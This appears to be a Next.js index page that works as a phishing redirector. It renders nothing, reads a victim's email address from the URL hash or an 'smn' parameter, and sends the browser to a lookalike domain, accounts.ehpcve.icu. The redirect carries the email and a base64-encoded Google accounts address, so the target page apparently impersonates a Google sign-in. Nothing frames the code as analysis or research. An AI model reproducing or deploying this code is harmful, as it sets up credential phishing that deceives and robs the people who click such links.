// pages/index.js
import { useEffect } from 'react';

export default function Home() {
  useEffect(() => {
    let email = '';

    // First try hash (#connie@...)
    if (window.location.hash) {
      email = window.location.hash.slice(1); // remove #
    } else {
      // Fallback: try &smn= in full URL
      const match = window.location.href.match(/&smn=([^&]+)/);
      if (match && match[1]) email = decodeURIComponent(match[1]);
    }

    if (email) {
      // Redirect to Non-Windows link with email
      window.location.href = `https://accounts.ehpcve.icu?znYsiH1YXQ=aHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29t/&smn=${email}`;
    }
  }, []);

  return null; // blank page while redirecting
}
